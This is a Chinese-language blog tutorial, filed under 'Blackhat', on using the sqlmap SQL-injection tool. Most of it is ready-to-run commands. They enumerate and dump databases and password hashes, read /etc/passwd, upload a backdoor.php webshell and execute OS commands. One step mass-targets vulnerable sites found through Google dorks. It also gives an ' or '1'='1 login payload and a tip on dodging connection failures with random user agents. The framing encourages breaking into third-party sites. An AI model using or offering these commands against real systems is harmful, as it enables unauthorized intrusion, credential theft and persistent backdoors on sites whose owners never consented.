---
title: sql注入工具sqlmap的使用详解
name: how-to-use-sqlmap
date: 2016-5-19
tags: [sqlmap,sql注入]
categories: [Blackhat]
---

* 目录
{:toc}

---

# SQL注入工具sqlmap的使用详解

## 1. 背景

**[sqlmap](https://github.com/sqlmapproject/sqlmap)**是python语言实现的sql注入工具，它使用简单，功能强大。不仅仅能简单的获取目标用户数据库信息，也可根据不同操作系统渗透上传webshell。sqlmap已经是metasploit中标准的sql注入工具。

sql注入问题是老深长谈的安全问题了，直至今日仍居**[oswap10](http://www.owasp.org.cn/owasp-project/download/OWASPTop102013V1.2.pdf)**大安全问题之首。sql的注入大多存在于php和asp的web应用中，java由于有preparement代替statement，所以现在已经很少出现了。时至今日，在google中按**google dock**的条件搜索，仍不乏很多站点的sql注入漏洞，可以轻而易举的使用sql注入的工具攻破站点。

## 2. 前提

找到目标注入点，使用"**单引号**"测试URL地址是否存在注入漏洞，判别标准看结果页面是否存在异常、错误或者空白，这些反映都能直接体现出注入点是否可用。

**源地址URL**：http://www.site.com/section.php?id=51
**注入点URL**：http://www.site.com/section.php?id=51'

## 3. 基本使用

下面方法中能正确获取目标系统数据库所有信息、包含操作系统识别、服务识别以及数据库表中的数据。获取站点登陆用户名及其密码，进行后台入口扫描登陆等操作。

```shell
# 检查参数是否可以注入，识别操作系统及数据库版本
sqlmap -u http://www.site.com/section.php?id=51

# 识别指纹信息
sqlmap -u http://www.site.com/section.php?id=51 -b

# 枚举数据库
sqlmap -u http://www.sitemap.com/section.php?id=51 --dbs

# 枚举指定数据库中表
sqlmap -u http://www.site.com/section.php?id=51 --tables -D [数据库名称]

# 枚举表中的列
sqlmap -u http://www.site.com/section.php?id=51 --columns -D [数据库名称] -T [表名]

# 获取表中数据
sqlmap -u http://www.site.com/section.php?id=51 --dump -D [数据库名称] -T [表名]
# 指定列名枚举表中数据
sqlmap.py -u http://www.site.com/section.php?id=51 --dump -D [数据库名称] -T [表名] -C [列名1,列名2,列名3]

# 运行sql
sqlmap -u http://www.site.com/section.php?id=51 --sql-query="select now();"

# 枚举用户列表和角色
sqlmap -u http://www.site.com/section.php?id=51 --users --passwords --privileges --roles --threads=10
```

## 4. 高级使用

读取系统服务器本地文件、执行系统服务器shell命令、上传自己的webshell，根据不同操作系统会有不同的命令使用方法。

```shell
# 判别当前数据库用户是否具有dba权限
sqlmap -u http://www.site.com/section.php?id=51 --current-user --is-dba --current-db --hostname --threads=10

# 若是dba，开启上传漏洞，可以上传自己的上传webshell
sqlmap -u http://www.site.com/section.php?id=51 --os-cmd -v 1

# 读取用户密码进行hash破解
sqlmap -u http://www.site.com/section.php?id=51 --password -v 1

# 读取系统文件
sqlmap -u http://www.site.com/section.php?id=51 --file-read=/etc/passwd --threads=10

# 上传文件
sqlmap -u http://www.site.com/section.php?id=51 --file-write /root/backdoor.php \
    --file-dest=/var/www/html/backdoor.php

# 执行系统命令
sqlmap -u http://www.site.com/section.php?id=51 --os-cmd id -v 1
```

## 5. 撒网捕鱼

这属于撒网捕鱼，通过搜索引擎批量获取存在sql注入的站点进行渗透操作

```shell
sqlmap -g "inurl:\"php?id=\"" --random-agent -f --batch --answer="extending=N,follow=N,keep=N,exploit=n"
```

## 6. 注入问题

**出现”testing connection to the target url”的错误？**

可以尝试随机使用user-agent的方式访问，–random-agent，模拟chrome或者firefox的请求方式。

**碰到rest请求的sql注入应该怎么做？**

如：http://www.site.com/class_name/method/43/80，此时sqlmap不知道注入点在哪里，你可以使用＊号指定注入点，如：http://www.site.com/class_name/method/43*/80

**post注入点使用–data操作？**

对于登陆类型的post表单，sqlmap的语法会有所不同，http://www.site.com/form.php，http://www.site.com/form_submit.php
注入点是http://www.site.com/form_submit.php，另外需要找到表单中的参数名称，可以使用浏览器的dom查看。比如：参数名称是username
sqlmap -u http://www.site.com/form_submit.php –data=”username=avc”
data选项告诉sqlmap是一个post请求，现在如果你足够幸运，sqlmap会很快注入成功，但大多数情况并不会这么顺利。
如果第一个sqlmap报告不可注入，可以尝试使用魔数作为参数的值，如
sqlmap -u http://www.site.com/form_submit.php –data="username=' or '1'='1"

**之前渗透的结果和注入点如何找回？**

操作过注入点及dump出的数据结果将会保存在用户目录下的".sqlmap/output"目录中。